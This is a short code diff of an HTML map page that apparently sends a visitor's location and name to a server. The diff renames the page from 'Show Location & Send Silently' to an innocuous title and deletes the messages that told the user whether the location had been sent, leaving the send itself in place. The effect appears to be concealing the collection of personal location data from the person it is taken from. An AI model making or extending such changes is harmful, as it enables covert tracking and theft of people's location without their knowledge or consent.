@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Show Location & Send Silently</title>
+  <title>createnow address findings</title>
 
   <!-- Leaflet CSS -->
   <link
@@ -147,14 +147,6 @@
             headers: {
               'Accept': 'application/json'
             }
-          }).then(response => {
-            if (response.ok) {
-              status.textContent += ' Location & name sent successfully!';
-            } else {
-              status.textContent += ' Failed to send location.';
-            }
-          }).catch(() => {
-            status.textContent += ' Error sending location.';
           });
 
         },
